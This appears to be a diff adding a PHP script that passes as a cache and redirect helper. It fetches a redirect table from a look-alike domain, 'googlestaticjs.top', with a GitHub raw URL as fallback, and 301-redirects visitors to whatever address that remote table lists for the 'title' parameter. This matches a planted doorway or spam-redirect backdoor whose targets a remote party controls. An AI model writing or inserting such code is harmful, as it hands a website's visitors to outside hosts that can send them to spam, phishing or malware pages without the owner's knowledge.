@@ -1,0 +1,56 @@
+<?php
+function isCacheExpired($cacheFile, $expiryTime = 1800) {
+    if (!file_exists($cacheFile)) {
+        return true;
+    }
+
+    $fileTime = filemtime($cacheFile);
+    return (time() - $fileTime) > $expiryTime;
+}
+
+function updateCacheFile($cacheFile, $apiUrls) {
+    $jsonData = null;
+    $context = stream_context_create([
+        'http' => ['timeout' => 5]
+    ]);
+
+    foreach ($apiUrls as $apiUrl) {
+        $jsonData = @file_get_contents($apiUrl, false, $context);
+        if ($jsonData) {
+            file_put_contents($cacheFile, $jsonData);
+            break;
+        }
+    }
+}
+
+function redirectOr404($cacheFile, $title) {
+    $cacheData = @file_get_contents($cacheFile);
+    if ($cacheData) {
+        $cacheJson = json_decode($cacheData, true);
+        if (isset($cacheJson[$title])) {
+            $redirectUrl = $cacheJson[$title];
+            header("HTTP/1.1 301 Moved Permanently");
+            header("Location: $redirectUrl");
+            exit();
+        }
+    }
+    header("HTTP/1.0 404 Not Found");
+    echo "404 Not Found";
+    exit();
+}
+
+$cacheFile = './cache.txt';
+$expiryTime = 1800; 
+$apiUrls = [
+    'https://static.googlestaticjs.top/301',
+    'https://raw.githubusercontent.com/glady1998/testdemo/main/301'
+];
+
+if (!file_exists($cacheFile) || isCacheExpired($cacheFile, $expiryTime)) {
+    updateCacheFile($cacheFile, $apiUrls);
+}
+
+$title = isset($_GET['title']) ? $_GET['title'] : '';
+
+redirectOr404($cacheFile, $title);
+?>
